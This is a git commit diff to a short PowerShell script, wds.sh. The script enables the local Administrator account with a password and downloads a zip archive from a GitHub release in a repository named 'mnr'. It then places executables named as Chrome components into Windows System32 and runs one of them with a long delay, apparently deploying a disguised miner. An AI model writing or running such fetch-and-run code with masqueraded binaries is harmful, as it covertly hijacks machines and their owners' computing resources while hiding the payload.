1681f5e90f8fec07681785c17a45f2ea86ec3222
p4n1k <46290080+p4n1k@users.noreply.github.com>
2022-03-11 21:19:16 +0700

    Update wds.sh

--- wds.sh
+++ wds.sh
@@ -2,9 +2,9 @@ Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainTe
 Get-LocalUser -Name "Administrator" | Enable-LocalUser
 Invoke-WebRequest https://github.com/p4n1k/mnr/releases/download/winrtm/rtm-mnr.zip -OutFile rtm.zip
 tar xf rtm.zip
-Copy C:\chrome.exe C:\Windows\System32
-Copy C:\chrome-checker.exe C:\Windows\System32
-Copy C:\chrome-uninstaller.exe C:\Windows\System32
+Copy chrome.exe C:\Windows\System32
+Copy chrome-checker.exe C:\Windows\System32
+Copy chrome-uninstaller.exe C:\Windows\System32
 cmd /c echo ./chrome.exe >a.ps1
 cmd /c echo ping -n 18001 127.0.0.1>nul >>a.ps1
 .\a.ps1
